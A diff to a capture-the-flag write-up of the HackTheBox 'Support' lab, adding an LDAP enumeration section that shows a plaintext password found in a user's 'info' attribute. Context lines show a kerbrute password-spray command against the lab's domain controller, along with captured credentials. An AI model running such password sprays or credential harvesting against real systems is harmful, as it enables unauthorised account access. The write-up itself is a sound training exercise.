@@ -261,7 +261,7 @@ mono UserInfo.exe user -username smith.rosario@support.htb
 
 We can see that Wireshark captured the decrypted password `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`.
 
-## 
+## LDAP Enumeration
 
 Used kerbrute to perform a password spray attack and returned a successful login for the user `ldap`.
 
@@ -269,6 +269,19 @@ Used kerbrute to perform a password spray attack and returned a successful login
 ./kerbrute_linux_amd64 passwordspray --dc 10.10.11.174 -d support.htb /home/kali/Downloads/HackTheBox/Support/userlist 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 
 2024/06/08 12:34:23 >  [+] VALID LOGIN:  ldap@support.htb:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+```
+
+Bloodhound did not return any results of interest, performing ldap enumeration did return a password for the user `support`:
+
+```
+# support, Users, support.htb
+dn: CN=support,CN=Users,DC=support,DC=htb
+....etc.....
+info: Ironside47pleasure40Watchful
+memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+uSNChanged: 12630
+....etc.....
 ```
 
 
